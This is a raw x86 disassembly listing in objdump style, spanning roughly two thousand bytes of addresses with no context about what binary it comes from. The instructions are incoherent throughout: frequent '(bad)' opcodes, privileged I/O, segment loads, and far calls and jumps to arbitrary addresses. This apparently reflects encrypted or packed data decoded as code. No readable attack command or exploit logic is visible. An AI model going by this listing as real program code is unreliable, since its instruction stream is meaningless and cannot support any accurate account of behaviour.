  4136a9:	add    bh,BYTE PTR [esi+0x1d]
  4136ac:	rol    DWORD PTR [ebp+ebx*1+0xc],0x80
  4136b1:	hlt    
  4136b2:	frstor [ebp-0x2e129364]
  4136b8:	(bad)  
  4136b9:	das    
  4136ba:	(bad)  
  4136bc:	mov    ebx,0x4f1c430b
  4136c1:	jecxz  0x413697
  4136c3:	hlt    
  4136c4:	loop   0x4136fa
  4136c6:	mov    al,ds:0x6ccc9c1e
  4136cb:	leave  
  4136cc:	ins    DWORD PTR es:[edi],dx
  4136cd:	(bad)  
  4136ce:	mov    ds:0x9e994238,al
  4136d3:	xor    bh,BYTE PTR [eax-0x33]
  4136d6:	xor    al,0x1e
  4136d8:	mov    ds,WORD PTR [ebx+0x22b1c493]
  4136de:	xchg   BYTE PTR [esp+edx*8+0x39],dh
  4136e2:	add    DWORD PTR [ebp+ebx*8-0x21],esi
  4136e6:	arpl   bp,cx
  4136e8:	jp     0x4136f0
  4136ea:	cs out 0xfa,al
  4136ed:	mov    ds:0x172941d,al
  4136f2:	or     DWORD PTR [edi+0x5d],ebp
  4136f5:	js     0x413698
  4136f7:	dec    ecx
  4136f8:	test   ebp,0x19acc933
  4136fe:	fdivr  DWORD PTR [edi+0x54]
  413701:	mov    cl,0xcd
  413703:	adc    ah,BYTE PTR [ebp+0x182278ef]
  413709:	pop    ebp
  41370a:	stc    
  41370b:	sbb    eax,0xe2725c81
  413710:	out    dx,eax
  413711:	fdiv   DWORD PTR [edx-0x44]
  413714:	xor    cl,ah
  413716:	jmp    0x819989c5
  41371b:	jo     0x4136fe
  41371d:	lock cmp ebp,DWORD PTR [ebx+0x28]
  413721:	outs   dx,BYTE PTR ds:[esi]
  413722:	adc    BYTE PTR [edx+ecx*8-0x4086f4b1],al
  413729:	lea    esi,[ecx]
  41372b:	popf   
  41372c:	fsub   DWORD PTR [edx-0x29727f47]
  413732:	rcl    BYTE PTR [esp+ecx*1+0x7ed882d2],0xa7
  41373a:	aaa    
  41373b:	lock arpl WORD PTR [ebx],di
  41373e:	mov    edx,0xe62e5554
  413743:	mov    esp,0x3e483061
  413748:	int3   
  413749:	into   
  41374a:	not    cl
  41374c:	inc    ebx
  41374d:	push   ebp
  41374e:	shr    DWORD PTR [esi+0x47],1
  413751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413752:	mov    WORD PTR [edi+0x23a89495],?
  413758:	fcmovb st,st(2)
  41375a:	mov    al,0xd2
  41375c:	mov    ss,WORD PTR [edi]
  41375e:	jecxz  0x41372f
  413760:	imul   ecx,DWORD PTR [ecx-0x21],0x43
  413764:	add    ah,BYTE PTR [esi]
  413766:	ret    0x6aac
  413769:	(bad)  [eax-0x79]
  41376c:	pop    edx
  41376d:	mov    bh,0xee
  41376f:	sub    BYTE PTR [eax+0x43b5f3c7],al
  413775:	xor    DWORD PTR [esi-0x20],ebp
  413778:	push   0xffffff8f
  41377a:	xchg   DWORD PTR [esi+0x59],esp
  41377d:	ret    0x17ba
  413780:	mov    esp,0xb94fbe97
  413785:	pushf  
  413786:	ins    BYTE PTR es:[edi],dx
  413787:	push   0xd0658e7a
  41378c:	mov    al,0x44
  41378e:	mov    ds:0x2230c00,eax
  413793:	xchg   edx,eax
  413794:	sbb    edx,DWORD PTR ds:0x8e670745
  41379a:	xor    edi,DWORD PTR [edx]
  41379c:	loopne 0x41372e
  41379e:	sbb    ecx,DWORD PTR [ebp-0x1b347d5a]
  4137a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137a5:	into   
  4137a6:	popf   
  4137a7:	cmp    esp,DWORD PTR [ebp+0x4b]
  4137aa:	adc    eax,0x3cc2691f
  4137af:	add    edi,DWORD PTR [ecx]
  4137b1:	mov    eax,0x71e38945
  4137b6:	div    ebx
  4137b8:	scas   al,BYTE PTR es:[edi]
  4137b9:	dec    ecx
  4137ba:	dec    bh
  4137bc:	(bad)  
  4137bd:	int3   
  4137be:	fimul  DWORD PTR [esi]
  4137c0:	(bad)  
  4137c1:	jnp    0x4137aa
  4137c3:	or     al,0x40
  4137c5:	inc    eax
  4137c6:	imul   edi,ebx,0x561cec19
  4137cc:	aaa    
  4137cd:	xlat   BYTE PTR ds:[ebx]
  4137ce:	dec    esp
  4137cf:	sahf   
  4137d0:	pop    ds
  4137d1:	mov    cl,0x98
  4137d3:	cmp    DWORD PTR [edi+edi*8+0x60a1e35a],0xae4449b7
  4137de:	rol    DWORD PTR [esi],1
  4137e0:	(bad)  
  4137e2:	pop    edx
  4137e3:	mov    ds:0x2f37de24,al
  4137e8:	cli    
  4137e9:	add    BYTE PTR [eax+0x6d6091cc],bl
  4137ef:	sbb    DWORD PTR [ebx+0x15],edi
  4137f2:	sbb    DWORD PTR [edi+0x58da569c],0x63
  4137f9:	mov    ebp,0x9aa37588
  4137fe:	test   eax,0x58333c68
  413803:	fistp  QWORD PTR [edi]
  413805:	mov    esp,0x43c38f1
  41380a:	mov    bh,0xd
  41380c:	dec    ecx
  41380d:	push   ebp
  41380e:	mov    ?,edx
  413810:	xchg   DWORD PTR [ecx+ebp*8+0x1a],ebx
  413814:	inc    ebx
  413815:	cwde   
  413816:	sub    DWORD PTR ds:0xc5cd8cad,esi
  41381c:	add    dl,dh
  41381e:	dec    eax
  41381f:	mov    ch,0xa7
  413821:	int3   
  413822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413823:	cmp    bl,BYTE PTR [eax]
  413825:	cmc    
  413826:	inc    edx
  413827:	or     esp,0x48
  41382a:	mov    ch,0xf1
  41382c:	sub    ch,0xea
  41382f:	cmp    DWORD PTR [ebx-0x383bb162],edx
  413835:	mov    ch,0xdb
  413837:	adc    BYTE PTR [ebx+0x1b],0x5f
  41383b:	xchg   edx,eax
  41383c:	dec    ebp
  41383d:	jbe    0x413814
  41383f:	sub    ebx,DWORD PTR [ebp-0x55fcb8c4]
  413845:	retf   0xff51
  413848:	in     eax,0x63
  41384a:	icebp  
  41384b:	pop    eax
  41384c:	cmp    edx,DWORD PTR [edx+0x2bfe19f2]
  413852:	add    ebx,DWORD PTR [ebx]
  413854:	xor    DWORD PTR [edi+edi*1+0x7f],0xfaed5ee5
  41385c:	cdq    
  41385d:	ret    0xa8
  413860:	iret   
  413861:	inc    esi
  413862:	and    esp,DWORD PTR [eax-0x6a]
  413865:	bound  esi,QWORD PTR [eax]
  413867:	cld    
  413868:	jns    0x413840
  41386a:	out    0xd8,eax
  41386c:	ja     0x413832
  41386e:	mov    DWORD PTR [eax],ecx
  413870:	mov    edi,ebp
  413872:	push   ebx
  413873:	daa    
  413874:	fs mov esi,esi
  413877:	mov    ebp,0x3c18e214
  41387c:	stos   DWORD PTR es:[edi],eax
  41387d:	cli    
  41387e:	test   DWORD PTR [ebp-0x40],0xe4bd4c77
  413885:	(bad)  
  413886:	cmp    ecx,ebp
  413888:	fisubr WORD PTR [ecx-0x41]
  41388b:	std    
  41388c:	sahf   
  41388d:	sti    
  41388e:	and    ebp,DWORD PTR [eax+0x29]
  413891:	in     al,0x5f
  413893:	mov    cl,0xc3
  413895:	out    0x67,al
  413897:	dec    ebx
  413898:	cld    
  413899:	sub    ecx,DWORD PTR [ecx-0x70]
  41389c:	dec    ebp
  41389d:	cs leave 
  41389f:	jmp    0xcb3c495
  4138a4:	(bad)  
  4138a5:	push   ecx
  4138a6:	cmp    al,0xeb
  4138a8:	dec    esp
  4138a9:	mov    ecx,0x71279939
  4138ae:	call   0xbade7440
  4138b3:	dec    edx
  4138b4:	dec    edx
  4138b5:	sahf   
  4138b6:	or     BYTE PTR [ebx+0x6a],0x4d
  4138ba:	into   
  4138bb:	adc    al,0xf
  4138bd:	stos   DWORD PTR es:[edi],eax
  4138be:	scas   eax,DWORD PTR es:[edi]
  4138bf:	dec    edi
  4138c0:	gs and bl,ah
  4138c3:	inc    eax
  4138c4:	push   eax
  4138c5:	in     al,0xc0
  4138c7:	mov    al,0x1c
  4138c9:	push   esi
  4138ca:	pusha  
  4138cb:	das    
  4138cc:	mov    ah,0x86
  4138ce:	psrlq  mm3,mm1
  4138d1:	dec    eax
  4138d2:	call   0xf224:0x96cce969
  4138d9:	jne    0x413860
  4138db:	and    ah,BYTE PTR [edx+0x52acf0bf]
  4138e1:	shl    ebx,1
  4138e3:	cdq    
  4138e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138e5:	fscale 
  4138e7:	fmulp  st(6),st
  4138e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ea:	sub    DWORD PTR [edi+0x3dcabc8d],ecx
  4138f0:	jne    0x413953
  4138f2:	add    dl,cl
  4138f4:	std    
  4138f5:	mov    esp,0xd0310a6c
  4138fa:	jbe    0x4138c2
  4138fc:	push   0xffffffa7
  4138fe:	aaa    
  4138ff:	gs sahf 
  413901:	(bad)  
  413902:	mov    ch,BYTE PTR [edi-0x14502df5]
  413908:	jno    0x41396e
  41390a:	hlt    
  41390b:	pushf  
  41390c:	or     DWORD PTR [edi],eax
  41390e:	mov    edx,edx
  413910:	es sub eax,0x942125da
  413916:	inc    edx
  413917:	mov    dh,BYTE PTR [ecx-0x7e]
  41391a:	inc    ebp
  41391b:	fld    DWORD PTR [ebx]
  41391d:	push   edx
  41391e:	cmp    eax,0x42f41621
  413923:	push   es
  413924:	push   es
  413925:	outs   dx,BYTE PTR ds:[esi]
  413926:	sahf   
  413927:	in     al,0xbe
  413929:	inc    edi
  41392a:	ins    BYTE PTR es:[edi],dx
  41392b:	std    
  41392c:	push   ss
  41392d:	mov    ecx,0xd61a2cef
  413932:	push   esp
  413933:	lea    esp,[ebp+0x51]
  413936:	jle    0x413911
  413938:	arpl   WORD PTR [esi-0x7fba766e],ax
  41393e:	idiv   DWORD PTR [ebp+0x3996f4d7]
  413944:	fidivr WORD PTR [ecx]
  413946:	not    dl
  413948:	ds in  eax,0xe
  41394b:	adc    dl,BYTE PTR [ebp-0x54]
  41394e:	fsubr  QWORD PTR [eax+0x10e472a4]
  413954:	and    ch,ah
  413956:	xchg   BYTE PTR [edi-0xb18faae],ah
  41395c:	cld    
  41395d:	add    al,0x69
  41395f:	es and ecx,0xc55e75d2
  413966:	imul   esp,ecx,0xa
  413969:	sbb    al,0xc5
  41396b:	mul    BYTE PTR [esi]
  41396d:	fs or  al,0x95
  413970:	repnz push esi
  413972:	icebp  
  413973:	cwde   
  413974:	or     eax,0x9f5bec9b
  413979:	(bad)  
  41397b:	sahf   
  41397c:	cmp    eax,0x28bd9db2
  413981:	jmp    0xc440f249
  413986:	les    ebp,FWORD PTR [ebx+0x4]
  413989:	(bad)  
  41398a:	les    eax,FWORD PTR [esi-0x65]
  41398d:	shl    DWORD PTR [esi],0x54
  413990:	lods   eax,DWORD PTR ds:[esi]
  413991:	pop    ecx
  413992:	(bad)  
  413993:	ja     0x413922
  413995:	or     eax,0xc1f664f7
  41399a:	lds    ebx,FWORD PTR [ecx+0x1d]
  41399d:	arpl   WORD PTR [ecx],dx
  41399f:	sub    DWORD PTR [ebx-0x6a],edx
  4139a2:	sbb    ecx,ebx
  4139a4:	pusha  
  4139a5:	mov    ecx,0x1561c4ad
  4139aa:	xchg   esi,eax
  4139ac:	dec    ecx
  4139ad:	inc    esp
  4139ae:	push   edx
  4139af:	inc    edx
  4139b0:	adc    al,BYTE PTR [ecx]
  4139b2:	iret   
  4139b3:	sti    
  4139b4:	jno    0x413948
  4139b6:	rol    DWORD PTR [edx],1
  4139b8:	popf   
  4139b9:	enter  0xac91,0x1b
  4139bd:	call   0xcb469c02
  4139c2:	push   ss
  4139c3:	mov    dh,0x95
  4139c5:	daa    
  4139c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139c7:	or     DWORD PTR ds:0xebbafb9,eax
  4139cd:	and    BYTE PTR [edi-0xc],0x28
  4139d1:	or     dh,BYTE PTR [eax-0x3d]
  4139d4:	push   edx
  4139d5:	(bad)  
  4139d6:	xlat   BYTE PTR ds:[ebx]
  4139d7:	(bad)  
  4139d9:	xchg   DWORD PTR [esi+eax*4-0x62053dac],ecx
  4139e0:	or     BYTE PTR [esi],bl
  4139e2:	jo     0x413a5a
  4139e4:	mov    ebp,0x5d54fdfa
  4139e9:	mov    eax,0xecd098ef
  4139ee:	mov    ecx,DWORD PTR [ebx-0x355c54e6]
  4139f4:	mov    ch,0x2b
  4139f6:	loope  0x413999
  4139f8:	push   ebx
  4139f9:	add    eax,eax
  4139fb:	cmp    BYTE PTR [ecx+0xb9da242],al
  413a01:	mov    ebp,0xd3627d67
  413a06:	gs mov edx,0x661618d
  413a0c:	dec    ecx
  413a0d:	pop    eax
  413a0e:	jo     0x413a8a
  413a10:	inc    edx
  413a11:	sub    eax,0x8b522418
  413a16:	nop
  413a17:	mov    cl,0x82
  413a19:	loop   0x4139ac
  413a1b:	pop    ebp
  413a1c:	imul   ecx,DWORD PTR [eax-0x3f],0xbba232fa
  413a23:	mov    bl,0xeb
  413a25:	pop    esi
  413a26:	ja     0x4139d3
  413a28:	pop    eax
  413a29:	test   BYTE PTR [esi-0x709163d7],dl
  413a2f:	sbb    BYTE PTR [ebp+0x35445ffb],ch
  413a35:	inc    edx
  413a36:	jmp    0x4139bd
  413a38:	clc    
  413a39:	out    0xe6,al
  413a3b:	mov    ch,BYTE PTR [esi+0x456c9947]
  413a41:	jg     0x413a07
  413a43:	outs   dx,DWORD PTR ds:[esi]
  413a45:	push   edx
  413a46:	jle    0x413a43
  413a48:	mov    dh,0x44
  413a4a:	test   DWORD PTR [edx-0x4b381d91],ebx
  413a50:	push   ds
  413a51:	loopne 0x413aa3
  413a53:	cld    
  413a54:	clc    
  413a55:	js     0x413aab
  413a57:	pop    es
  413a58:	xchg   edi,eax
  413a59:	xor    ebx,ecx
  413a5b:	fadd   QWORD PTR [ebx]
  413a5d:	aas    
  413a5e:	sub    eax,0x85974312
  413a63:	ins    BYTE PTR es:[edi],dx
  413a64:	lods   al,BYTE PTR ds:[esi]
  413a65:	(bad)  
  413a66:	mov    al,0xe9
  413a68:	jmp    0x413a8e
  413a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a6b:	leave  
  413a6c:	mov    ds:0xfd47e45a,al
  413a71:	push   cs
  413a72:	inc    ecx
  413a73:	add    al,0xc1
  413a75:	cli    
  413a76:	cmc    
  413a77:	or     al,0x44
  413a79:	jle    0x413a1c
  413a7b:	or     DWORD PTR [edi+0x7c],ebx
  413a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a7f:	out    dx,al
  413a80:	(bad)  
  413a81:	xchg   ecx,eax
  413a82:	shr    esi,1
  413a84:	das    
  413a85:	and    dh,dl
  413a87:	add    eax,DWORD PTR [ebx+0x9]
  413a8a:	inc    esp
  413a8b:	scas   al,BYTE PTR es:[edi]
  413a8c:	jae    0x413a9e
  413a8e:	adc    DWORD PTR [esi+0x82b9197],edi
  413a94:	dec    esi
  413a95:	mov    WORD PTR [edi+0x6cfa9fd6],cs
  413a9b:	mov    edx,0x69327194
  413aa0:	pop    ecx
  413aa1:	sub    dh,BYTE PTR [ecx+0x7013d84b]
  413aa7:	aam    0x33
  413aa9:	mov    dl,BYTE PTR [ecx]
  413aab:	xor    ecx,DWORD PTR [ebx]
  413aad:	xor    eax,0xc4cf2752
  413ab2:	inc    eax
  413ab3:	dec    ebp
  413ab4:	sbb    BYTE PTR [edx+edi*2-0x640e24c0],al
  413abb:	jmp    0x67df:0xffe182dc
  413ac2:	ror    DWORD PTR [edx],cl
  413ac4:	mov    DWORD PTR [ebx+eiz*4+0x7c],edi
  413ac8:	or     BYTE PTR [esi+eax*2+0x54],cl
  413acc:	xchg   ebx,eax
  413acd:	in     eax,dx
  413ace:	mov    edx,0x79acbc09
  413ad3:	jecxz  0x413b1d
  413ad5:	imul   edx,DWORD PTR ds:0x685ddb23,0xffffff89
  413adc:	push   eax
  413add:	retf   0x5ba1
  413ae0:	mov    ds,WORD PTR [ecx-0x72]
  413ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae4:	call   0x767:0xd8293b7f
  413aeb:	or     DWORD PTR [ebp-0x2d],0xa
  413aef:	loopne 0x413b07
  413af1:	add    ecx,DWORD PTR [ebp+0x66678ee6]
  413af7:	ret    0x6aac
  413afa:	das    
  413afb:	mov    ds:0x18e65ea2,al
  413b00:	jnp    0x413b6f
  413b02:	bound  ecx,QWORD PTR [ebp-0x78241406]
  413b08:	rol    DWORD PTR [ebx],1
  413b0a:	mov    ds:0x4161ce4f,al
  413b0f:	stos   BYTE PTR es:[edi],al
  413b10:	sub    al,0xdc
  413b12:	jno    0x413b85
  413b14:	cld    
  413b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b17:	sbb    DWORD PTR [esi+0x2e],ecx
  413b1a:	sbb    eax,0x20fb38b7
  413b1f:	mov    bh,0xf5
  413b21:	jmp    0x413b65
  413b23:	xor    al,BYTE PTR [edx+0x13]
  413b26:	dec    ebx
  413b27:	lock inc ebx
  413b29:	(bad)  
  413b2a:	bound  ebp,QWORD PTR [eax-0x3f]
  413b2d:	into   
  413b2e:	jge    0x413b4d
  413b30:	adc    BYTE PTR [ecx],0xab
  413b33:	aam    0x88
  413b35:	push   ds
  413b36:	and    eax,0xdf558650
  413b3b:	jecxz  0x413b7e
  413b3d:	fs cmc 
  413b3f:	and    eax,0x7bcdfaf0
  413b44:	cmp    ch,cl
  413b46:	mov    ebp,esp
  413b48:	adc    DWORD PTR ds:[edi-0x4a],esi
  413b4c:	pop    ebx
  413b4d:	xor    BYTE PTR [esi-0x496bb3d6],ah
  413b53:	jnp    0x413b71
  413b55:	and    dh,bl
  413b57:	fs call 0xc9a1:0xecd5ed7d
  413b5f:	aaa    
  413b60:	pop    ebp
  413b61:	inc    ebx
  413b62:	clc    
  413b63:	cmc    
  413b64:	cmc    
  413b65:	(bad)  
  413b66:	xor    DWORD PTR [ecx],ecx
  413b68:	sbb    BYTE PTR [eax],dh
  413b6a:	push   es
  413b6b:	nop
  413b6c:	mov    esp,0x2eba90d6
  413b71:	ins    BYTE PTR es:[edi],dx
  413b72:	call   0xaf07:0xffb82af9
  413b79:	fs mov edi,0x8c42d7a9
  413b7f:	push   esi
  413b80:	mov    al,0xec
  413b82:	cwde   
  413b83:	push   ss
  413b84:	sbb    BYTE PTR [eax+0x5dff4b3],ch
  413b8a:	das    
  413b8b:	xchg   edi,eax
  413b8c:	jge    0x413b99
  413b8e:	jne    0x413b69
  413b90:	(bad)  
  413b91:	mov    al,0x8d
  413b93:	je     0x413c0e
  413b95:	xor    eax,DWORD PTR [ebp-0x65ffd345]
  413b9b:	push   cs
  413b9c:	pop    ebx
  413b9d:	das    
  413b9e:	stos   DWORD PTR es:[edi],eax
  413b9f:	cmp    esi,DWORD PTR [ecx]
  413ba1:	jl     0x413b6e
  413ba3:	lea    esi,ds:0x5f22630c
  413ba9:	jbe    0x413bac
  413bab:	(bad)  
  413bac:	sub    edx,DWORD PTR [ebx]
  413bae:	mov    dh,0xa
  413bb0:	ins    BYTE PTR es:[edi],dx
  413bb1:	inc    ebx
  413bb2:	dec    edx
  413bb3:	push   es
  413bb4:	mov    dh,0xfc
  413bb6:	(bad)  
  413bb7:	mov    esi,0x737da201
  413bbc:	and    bh,BYTE PTR [esi]
  413bbe:	dec    edx
  413bbf:	mov    BYTE PTR [ebx-0xf],cl
  413bc2:	add    edx,DWORD PTR [edx-0x2d6cfe83]
  413bc8:	sub    BYTE PTR [ebp-0x80],0x5a
  413bcc:	js     0x413bf9
  413bce:	cmp    al,BYTE PTR [ebx+0x17c32796]
  413bd4:	imul   BYTE PTR [esi]
  413bd6:	fucom  st(3)
  413bd8:	pusha  
  413bd9:	or     BYTE PTR [eax+0x53],0xad
  413bdd:	inc    eax
  413bde:	and    ch,al
  413be0:	faddp  st(1),st
  413be2:	sub    al,0x15
  413be4:	jmp    0xba7b:0xfb1bd8e6
  413beb:	mov    ebx,0xd1131859
  413bf0:	and    dl,bl
  413bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bf3:	push   edx
  413bf4:	mov    al,ds:0x61dddb8c
  413bf9:	lods   eax,DWORD PTR ds:[esi]
  413bfa:	clc    
  413bfb:	inc    edx
  413bfc:	ins    BYTE PTR es:[edi],dx
  413bfd:	cmp    al,0x63
  413bff:	xor    ebx,DWORD PTR [ebx]
  413c01:	xor    edx,eax
  413c03:	in     al,dx
  413c04:	ds jecxz 0x413c65
  413c07:	mov    bh,bl
  413c09:	mov    al,ds:0xb71fe361
  413c0e:	in     al,0xa1
  413c10:	(bad)  
  413c11:	addr16 inc esp
  413c13:	jecxz  0x413bf7
  413c15:	inc    edi
  413c16:	push   ebp
  413c17:	pop    eax
  413c18:	xchg   ebp,eax
  413c19:	xchg   edx,eax
  413c1a:	ja     0x413c14
  413c1c:	jno    0x413baa
  413c1e:	jp     0x413c8c
  413c20:	sbb    DWORD PTR [ecx+0x6f106ad9],ebx
  413c26:	mov    ah,0xcf
  413c28:	(bad)
  413c2b:	inc    edi
  413c2c:	cmp    edx,DWORD PTR ds:0xfead51a8
  413c32:	jbe    0x413c70
  413c34:	jmp    0xb57c:0x33166485
  413c3b:	add    al,0xc8
  413c3d:	pop    ss
  413c3e:	adc    al,0x28
  413c40:	(bad)  
  413c41:	shl    BYTE PTR [ebx],1
  413c43:	je     0x413bfe
  413c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c46:	mov    dl,0xcc
  413c48:	call   0x25af:0xae22708d
  413c4f:	mov    eax,0x5496be9
  413c54:	ins    BYTE PTR es:[edi],dx
  413c55:	gs int3 
  413c57:	push   ebx
  413c58:	fdiv   QWORD PTR [edx+0xd16633f]
  413c5e:	lahf   
  413c5f:	mov    bh,0xf7
  413c61:	scas   eax,DWORD PTR es:[edi]
  413c62:	mov    DWORD PTR [ebp-0x2292848c],edi
  413c68:	pop    ss
  413c69:	stos   DWORD PTR es:[edi],eax
  413c6a:	or     DWORD PTR [edi-0x12],ebp
  413c6d:	pop    ds
  413c6e:	mov    ebp,DWORD PTR [ecx+0x75]
  413c71:	stc    
  413c72:	xor    DWORD PTR [ecx+0x28ec992c],0xc9f30582
  413c7c:	sbb    al,0x97
  413c7e:	mov    al,0x87
  413c80:	mov    ah,0x8e
  413c82:	loopne 0x413c56
  413c84:	inc    edx
  413c85:	ss hlt 
  413c87:	jbe    0x413c5c
  413c89:	push   esp
  413c8a:	enter  0x32dc,0x67
  413c8e:	mov    al,ds:0xd245b6ed
  413c93:	sub    BYTE PTR [esi],dl
  413c95:	and    al,0xf4
  413c97:	xor    DWORD PTR [esi-0x6d],ebx
  413c9a:	adc    ebx,DWORD PTR [edx+0x3cdd6dd7]
  413ca0:	xchg   BYTE PTR [eax+0x1],dl
  413ca3:	and    edx,DWORD PTR [ebx+0x1b1ebdda]
  413ca9:	test   eax,0x8f2e79d0
  413cae:	sub    eax,0xbef7d2ce
  413cb3:	clc    
  413cb4:	adc    eax,0xa5d3f9bd
  413cb9:	dec    esi
  413cba:	and    BYTE PTR [esi],cl
  413cbc:	pusha  
  413cbd:	fst    st(7)
  413cbf:	push   esi
  413cc0:	inc    edi
  413cc1:	cmp    BYTE PTR [edx+0x5f3a43c9],ch
  413cc7:	dec    ebx
  413cc8:	mov    dh,0x12
  413cca:	xor    al,BYTE PTR [ebx-0x614bab53]
  413cd0:	cmp    DWORD PTR [ebx+0x54a95b2],ebp
  413cd6:	dec    ecx
  413cd7:	test   BYTE PTR [edx+0x3395069b],0x56
  413cde:	out    dx,eax
  413cdf:	repnz xchg esi,eax
  413ce1:	or     eax,0x4d3cab
  413ce6:	test   DWORD PTR [ebx],ebx
  413ce8:	nop
  413ce9:	imul   ebp,DWORD PTR [edx+edi*1+0x62],0x1d
  413cee:	enter  0x8013,0x7f
  413cf2:	data16 arpl WORD PTR [edi-0x64df0025],si
  413cf9:	mov    bh,0x8d
  413cfb:	cmc    
  413cfc:	add    bh,ch
  413cfe:	test   BYTE PTR [esi+0x2169f474],bh
  413d04:	inc    ebp
  413d05:	inc    ecx
  413d06:	push   ebp
  413d07:	rcr    DWORD PTR [esi+0x77],0x6f
  413d0b:	sbb    eax,0x19c160a7
  413d10:	dec    edi
  413d11:	in     eax,0x3d
  413d13:	lds    eax,FWORD PTR [edi+ebx*2+0x6e]
  413d17:	call   0xf119:0x27a6b21a
  413d1e:	lahf   
  413d1f:	cld    
  413d20:	jne    0x413d5c
  413d22:	fwait
  413d23:	outs   dx,DWORD PTR ds:[esi]
  413d24:	in     eax,dx
  413d25:	mov    ds:0xc173dcb,al
  413d2b:	out    0x67,eax
  413d2d:	dec    ebx
  413d2e:	lahf   
  413d2f:	dec    ecx
  413d30:	sti    
  413d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d32:	jg     0x413d64
  413d34:	lods   eax,DWORD PTR ds:[esi]
  413d35:	push   0x9f7cb9fa
  413d3a:	call   0xe1e0f442
  413d3f:	xor    DWORD PTR [edx+0x6a],ebx
  413d42:	out    0x38,al
  413d44:	daa    
  413d45:	idiv   DWORD PTR [ecx-0x78f4ed2b]
  413d4b:	dec    eax
  413d4c:	imul   esp,ebp,0xffffffd4
  413d4f:	mov    ch,0x84
  413d51:	xor    eax,0xb402f8d8
  413d56:	dec    ebp
  413d57:	add    esp,DWORD PTR [edi+0x2d]
  413d5a:	mov    ds:0x5b620c44,eax
  413d5f:	rol    bl,1
  413d61:	ins    DWORD PTR es:[edi],dx
  413d62:	in     al,0x55
  413d64:	pop    esp
  413d65:	aad    0xf1
  413d67:	or     eax,0x37c71a08
  413d6c:	jmp    0xaac0:0xe7b3df68
  413d73:	add    bl,bl
  413d75:	add    ebp,DWORD PTR [esi-0x786cf340]
  413d7b:	inc    edi
  413d7c:	ins    BYTE PTR es:[edi],dx
  413d7d:	sub    DWORD PTR [esi+0x7a3be55e],edx
  413d83:	sub    ebp,DWORD PTR [esi+0x25eb8b82]
  413d89:	aaa    
  413d8a:	push   esi
  413d8b:	imul   esp,DWORD PTR [ecx+0x45a9bd85],0xffffffd7
  413d92:	sub    edi,DWORD PTR [edi-0x19e4bbb7]
  413d98:	es ret 0x8350
  413d9c:	rcl    BYTE PTR [ebx+esi*4],1
  413d9f:	push   eax
  413da1:	mov    cs:0x6ca6f0a7,al
  413da7:	mov    ebx,0x72d45d93
  413dac:	xchg   esi,eax
  413dad:	jge    0x413db0
  413daf:	jmp    0x413e01
  413db1:	sbb    eax,0x7791bb66
  413db6:	add    eax,0x30b8d94a
  413dbb:	fistp  QWORD PTR [eax+0x1b6ddc52]
  413dc1:	and    BYTE PTR ds:0x61aaed3b,bh
  413dc7:	rcl    DWORD PTR [ebx-0x4d],1
  413dca:	cmp    eax,0xdfd761d8
  413dcf:	fdivrp st(7),st
  413dd1:	aaa    
  413dd2:	cld    
  413dd3:	jne    0x413d9f
  413dd5:	lea    esp,[ebp-0x3e]
  413dd8:	dec    esp
  413dd9:	cdq    
  413dda:	and    BYTE PTR [eax],bh
  413ddc:	xchg   esi,eax
  413ddd:	dec    ebp
  413ddf:	nop
  413de0:	stos   BYTE PTR es:[edi],al
  413de1:	and    DWORD PTR [ebx+0x13143228],eax
  413de7:	loop   0x413e07
  413de9:	data16 jbe 0x413e66
  413dec:	data16 hlt 
  413dee:	enter  0xc478,0x84
  413df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413df3:	stc    
  413df4:	adc    ebp,DWORD PTR [eax+0x5c]
  413df7:	pop    ebx
  413df8:	mov    eax,ds:0xe2e7ac7
  413dfd:	mov    dh,BYTE PTR [edx+0x3c]
  413e00:	sbb    edi,eax
  413e02:	xchg   edx,eax
  413e03:	sbb    edi,DWORD PTR [edx+0x9]
  413e06:	mov    cs,edx
  413e08:	push   edi
  413e09:	mov    ch,BYTE PTR [edi-0x59de80f9]
  413e0f:	dec    eax
  413e10:	xor    al,al
  413e12:	(bad)  
  413e14:	adc    ebp,DWORD PTR [ecx-0x72652c15]
  413e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e1b:	das    
  413e1c:	jb     0x413e4f
  413e1e:	xchg   ch,ah
  413e20:	mov    bh,0x5c
  413e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e23:	(bad)  
  413e24:	mov    edi,0x62a5f3f9
  413e29:	mov    ebp,0xfe506f6f
  413e2e:	inc    edx
  413e2f:	xor    al,0x2e
  413e31:	cwde   
  413e32:	xchg   BYTE PTR [ebx+0x7ee268eb],bh
  413e38:	in     eax,dx
  413e39:	(bad)  
  413e3a:	pop    edi
  413e3b:	fdiv   QWORD PTR [edi]
  413e3d:	jb     0x413de0
  413e3f:	jle    0x413eae
  413e41:	gs xchg edx,eax
  413e43:	jecxz  0x413e94
  413e45:	jns    0x413e09
  413e47:	ja     0x413e7e
  413e49:	icebp  
  413e4a:	(bad)  
  413e4b:	push   ebx
  413e4c:	xor    BYTE PTR [eax+0x20],ch
  413e4f:	pop    es
  413e50:	(bad)  
  413e51:	outs   dx,DWORD PTR ds:[esi]
  413e52:	into   
  413e53:	fiadd  WORD PTR [edx-0x20b46b34]
  413e59:	int3   
  413e5a:	std    
  413e5b:	push   ds
  413e5c:	int3   
  413e5d:	add    BYTE PTR [eax-0x56],al
  413e60:	enter  0x472f,0x11
  413e64:	(bad)  [edi-0x7a]
  413e67:	sbb    eax,ecx
  413e69:	or     ecx,ecx
  413e6b:	xchg   ebp,eax
  413e6c:	mov    eax,edi
  413e6e:	(bad)  
  413e6f:	in     eax,dx
  413e70:	jg     0x413e87
  413e72:	mov    ah,0x2c
  413e74:	push   ss
  413e75:	xchg   esi,eax
